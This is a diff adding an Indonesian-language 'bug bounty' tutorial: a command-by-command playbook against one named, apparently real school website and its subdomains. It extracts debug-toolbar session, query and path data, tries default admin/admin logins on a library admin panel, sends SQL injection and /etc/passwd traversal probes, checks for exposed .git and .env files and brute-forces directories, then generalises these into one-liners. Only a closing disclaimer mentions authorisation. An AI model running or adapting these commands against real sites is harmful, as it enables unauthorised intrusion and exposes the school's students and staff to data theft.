@@ -1,0 +1,253 @@
+# TUTORIAL FULLSCAN - Bug Bounty Methodology
+# ==============================================
+# Target: https://smkn1wonosari.sch.id/
+# Berdasarkan temuan aktual di atas
+# Cara replikasi: gunakan tools dan teknik yang sama
+
+
+=== PRASYARAT ===
+- Kali Linux atau distro Linux lain
+- akses terminal/bash
+- curl (biasanya sudah ada)
+- subfinder (install: `go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest`)
+- httpx (install: `go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest`)
+- nuclei (opsional, untuk automated scanning)
+- grep, wc, sort, uniq (biasanya sudah ada)
+
+=== LANGKAH 1: RECONNAISSANCE ===
+# Install tools jika belum ada
+go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+
+# Step 1.1: Enumerate subdomains
+subfinder -d smkn1wonosari.sch.id -all -o subdomains.txt
+
+# Step 1.2: Check live subdomains
+cat subdomains.txt | while read sub; do
+  code=$(curl -s --max-time 5 -o /dev/null -w "%{http_code}" "https://$sub/")
+  if [ "$code" != "000" ] && [ "$code" != "404" ]; then
+    echo "$sub -> $code"
+  fi
+done
+
+# Step 1.3: Verify main site
+curl -s -I https://smkn1wonosari.sch.id/
+curl -s --max-time 15 "https://smkn1wonosari.sch.id/" | head -c 2500
+
+=== LANGKAH 2: TECHNOLOGY IDENTIFICATION ===
+# Check server, framework, cookies
+curl -s -I https://smkn1wonosari.sch.id/ | grep -iE "server|content-type|set-cookie|strict|hsts"
+curl -s --max-time 15 "https://smkn1wonosari.sch.id/" | grep -ioE "CodeIgniter|mazo|theme|ci_session|MazoTheme"
+
+# Check composer.json
+curl -s --max-time 10 "https://smkn1wonosari.sch.id/composer.json"
+
+# Check admin panel
+curl -s --max-time 10 "https://smkn1wonosari.sch.id/administrator"
+curl -s --max-time 10 "https://smkn1wonosari.sch.id/login"
+
+# Check directories
+curl -s --max-time 5 "https://smkn1wonosari.sch.id/application/"
+curl -s --max-time 5 "https://smkn1wonosari.sch.id/system/"
+
+=== LANGKAH 3: SUBDOMAIN EXPLOITATION ===
+# Check each subdomain
+for sub in www esurat sasana lulus jadwal; do
+  echo "=== $sub.smkn1wonosari.sch.id ==="
+  curl -s --max-time 10 "https://$sub.smkn1wonosari.sch.id/" | head -c 500
+  echo ""
+  
+  # Check for admin/login
+  curl -s --max-time 5 -o /dev/null -w "admin: %{http_code}\n" "https://$sub.smkn1wonosari.sch.id/admin/"
+  curl -s --max-time 5 -o /dev/null -w "login: %{http_code}\n" "https://$sub.smkn1wonosari.sch.id/login"
+done
+
+# ESURAT - check for debugbar
+curl -s --max-time 15 "https://esurat.smkn1wonosari.sch.id/" | grep -o 'id="debugbar_loader"'
+curl -s --max-time 15 "https://esurat.smkn1wonosari.sch.id/" | grep -o 'data-time="[0-9.]*"'
+
+# SASANA - check for SLiMS
+curl -s --max-time 15 "https://sasana.smkn1wonosari.sch.id/" | grep -o 'SLiMS [0-9]'
+curl -s --max-time 10 "https://sasana.smkn1wonosari.sch.id/admin/" -o /dev/null -w "admin: %{http_code}\n"
+
+=== LANGKAH 4: DEBUGBAR VERIFICATION (ESURAT) ===
+# Verify debugbar is active
+curl -s --max-time 15 "https://esurat.smkn1wonosari.sch.id/" > /tmp/page.html
+grep 'debugbar_loader' /tmp/page.html
+grep 'data-time=' /tmp/page.html
+
+# Get the debugbar data
+TIMESTAMP=$(grep -oP 'data-time="\K[0-9.]+' /tmp/page.html)
+curl -s --max-time 15 "https://esurat.smkn1wonosari.sch.id/index.php?debugbar_time=$TIMESTAMP" > /tmp/debugbar.html
+
+# Extract actual data
+echo "=== Server Config ==="
+grep -A2 'Environment' /tmp/debugbar.html | head -5
+grep -A2 'CodeIgniter Version' /tmp/debugbar.html | head -5
+grep -A2 'PHP Version' /tmp/debugbar.html | head -5
+
+echo "=== Database Query ==="
+grep -A5 'SELECT' /tmp/debugbar.html | head -10
+
+echo "=== View Data ==="
+grep -A2 'View Data' /tmp/debugbar.html | head -5
+
+echo "=== Session Data ==="
+grep -A2 'Session User Data' /tmp/debugbar.html | head -5
+
+echo "=== Controller Path ==="
+grep 'APPPATH/Controllers' /tmp/debugbar.html | head -3
+
+echo "=== File Paths ==="
+grep -oE 'APPPATH/[^<]+' /tmp/debugbar.html | sort | uniq | head -20
+grep -oE 'SYSTEMPATH/[^<]+' /tmp/debugbar.html | sort | uniq | head -10
+
+echo "=== All 10 Tabs ==="
+grep -oE 'data-tab="ci-[^"]*"' /tmp/debugbar.html | sort | uniq
+
+=== LANGKAH 5: SLiMS EXPLOITATION ===
+# Check SLiMS admin access
+curl -s --max-time 10 "https://sasana.smkn1wonosari.sch.id/admin/" -o /dev/null -w "admin: %{http_code}\n"
+curl -s --max-time 10 "https://sasana.smkn1wonosari.sch.id/admin/index.php" -o /dev/null -w "admin/index.php: %{http_code}\n"
+
+# Check data endpoints
+for endpoint in databuku datapinjam anggota simak; do
+  curl -s --max-time 10 "https://sasana.smkn1wonosari.sch.id/index.php/$endpoint" -o /dev/null -w "$endpoint: %{http_code}\n"
+done
+
+# Check API endpoints
+for endpoint in simak anggota buku; do
+  curl -s --max-time 10 "https://sasana.smkn1wonosari.sch.id/index.php/api/$endpoint" -o /dev/null -w "api/$endpoint: %{http_code}\n"
+done
+
+# Check export endpoints
+curl -s --max-time 10 "https://sasana.smkn1wonosari.sch.id/index.php/export" -o /dev/null -w "export: %{http_code}\n"
+curl -s --max-time 10 "https://sasana.smkn1wonosari.sch.id/index.php/export/xml" -o /dev/null -w "export/xml: %{http_code}\n"
+curl -s --max-time 10 "https://sasana.smkn1wonosari.sch.id/index.php/export/csv" -o /dev/null -w "export/csv: %{http_code}\n"
+
+# Check admin login with default credentials
+curl -s --max-time 10 -c /tmp/sms_cookies.txt -X POST "https://sasana.smkn1wonosari.sch.id/index.php?p=login" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "nama=admin&pass=admin" -o /dev/null -w "admin/admin: %{http_code}\n"
+
+# Check after login
+curl -s --max-time 10 -b /tmp/sms_cookies.txt "https://sasana.smkn1wonosari.sch.id/admin/" -o /dev/null -w "after login: %{http_code}\n"
+
+# Check config file
+curl -s --max-time 10 "https://sasana.smkn1wonosari.sch.id/index.php/smcp/config.php" -o /dev/null -w "smcp/config: %{http_code}\n"
+
+=== LANGKAH 6: VULNERABILITY TESTING ===
+# SQL Injection test
+curl -s --max-time 10 "https://esurat.smkn1wonosari.sch.id/index.php?kode=1%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL" | head -c 500
+
+# LFI test
+curl -s --max-time 10 "https://smkn1wonosari.sch.id/index.php?file=../../../../etc/passwd" | head -c 500
+
+# Debug mode trigger
+curl -s --max-time 10 "https://smkn1wonosari.sch.id/?_debug=1" -o /dev/null -w "?_debug=1: %{http_code}\n"
+curl -s --max-time 10 "https://smkn1wonosari.sch.id/?XDEBUG_SESSION_START=1" -o /dev/null -w "?XDEBUG: %{http_code}\n"
+
+# CSRF check
+curl -s --max-time 10 "https://smkn1wonosari.sch.id/login" | grep -ioE "csrf|token" | head -3
+
+# Security headers check
+curl -s -I https://smkn1wonosari.sch.id/ | grep -iE "x-frame|x-content|content-security|x-xss|referrer|strict"
+
+=== LANGKAH 7: AUTOMATED SCANNING (NUCLEI) ===
+# Install nuclei
+go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
+
+# Run nuclei scan
+nuclei -u "https://smkn1wonosari.sch.id" -t /path/to/nuclei-templates/ -severity critical,high -timeout 10 -silent
+nuclei -u "https://esurat.smkn1wonosari.sch.id" -t /path/to/nuclei-templates/ -severity critical,high -timeout 10 -silent
+
+=== LANGKAH 8: RECONNAISSANCE LANJUTAN ===
+# Deep subdomain enumeration
+subfinder -d smkn1wonosari.sch.id -all -o subdomains.txt
+httpx -l subdomains.txt -status-code -title -tech-detect -o live_subdomains.txt
+
+# Directory brute force
+ffuf -u "https://smkn1wonosari.sch.id/FUZZ" -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -o dirs.txt
+
+# Check for git exposure
+curl -s --max-time 5 "https://smkn1wonosari.sch.id/.git/config" -o /dev/null -w ".git: %{http_code}\n"
+curl -s --max-time 5 "https://smkn1wonosari.sch.id/.git/" -o /dev/null -w ".git/ : %{http_code}\n"
+
+# Check for composer.json
+curl -s --max-time 5 "https://smkn1wonosari.sch.id/composer.json" -o /dev/null -w "composer.json: %{http_code}\n"
+
+# Check for .env
+curl -s --max-time 5 "https://smkn1wonosari.sch.id/.env" -o /dev/null -w ".env: %{http_code}\n"
+
+=== LANGKAH 9: REPORTING ===
+# Compile findings
+# For each finding, include:
+# 1. URL of vulnerable endpoint
+# 2. HTTP status code (from curl)
+# 3. Actual response content (from curl)
+# 4. Impact assessment
+# 5. Proof of concept
+
+# Example report format:
+echo "FINDING: [Title]"
+echo "SEVERITY: [CRITICAL/HIGH/MEDIUM/LOW]"
+echo "ENDPOINT: [URL]"
+echo "PROOF: curl -s [URL] | grep [pattern]"
+echo "IMPACT: [What data is exposed]"
+echo "HOW TO EXPLOIT: [Steps]"
+echo ""
+
+=== TIPS DAN TRIK ===
+
+1. SELALU gunakan curl untuk verifikasi, bukan asumsi
+2. Setiap finding HARUS punya HTTP response code
+3. Cek semua parameter URL untuk debugging
+4. Debugbar di CodeIgniter adalah emas - selalu cek
+5. SLiMS sering punya auth bypass - cek /admin/
+6. Gunakan subfinder untuk enumerate subdomains
+7. Jangan lupa check subdomains dengan httpx
+8. Cek .git, .env, composer.json di root
+9. Cek /application/ dan /system/ directory access
+10. Security headers adalah indikator penting
+11. Development mode = CRITICAL finding
+12. Client-side-only auth = NOT real authentication
+
+=== COMMANDS CEPAT ===
+
+# Quick recon one-liner
+subfinder -d target.sch.id -all -o sub.txt && httpx -l sub.txt -status-code -tech-detect
+
+# Debugbar check
+curl -s target.com/ | grep -o 'data-time="[0-9.]*"' && curl -s "target.com/index.php?debugbar_time=$(curl -s target.com/ | grep -oP 'data-time="\K[0-9.]+')"
+
+# SLiMS check
+curl -s target.com/ | grep -o 'SLiMS [0-9]' && curl -s target.com/admin/ | head -c 100
+
+# SQLi test
+curl -s "target.com/index.php?id=1%20UNION%20SELECT%20NULL,NULL,NULL" | grep -iE "error|mysql|sql|syntax"
+
+# Security headers
+curl -s -I target.com/ | grep -iE "x-frame|x-content|content-security|x-xss|strict|referrer"
+
+# Directory listing
+curl -s target.com/application/ | grep -iE "Index of|Forbidden|Directory"
+
+# Config file exposure
+curl -s target.com/config.php -o /dev/null -w "%{http_code}\n"
+curl -s target.com/.env -o /dev/null -w "%{http_code}\n"
+
+=== TOOLS YANG DIPERLUKAN ===
+- subfinder: subdomain enumeration
+- httpx: HTTP probing and tech detection
+- nuclei: automated vulnerability scanning
+- ffuf: directory brute forcing
+- curl: HTTP requests and verification
+- grep: pattern matching
+- sort, uniq, wc: data processing
+- jq: JSON parsing (optional)
+
+=== DISCLAIMER ===
+- Only test on targets you have authorization to test
+- This tutorial is for educational purposes only
+- Do not use these techniques for illegal activities
+- Always report findings responsibly to the target organization
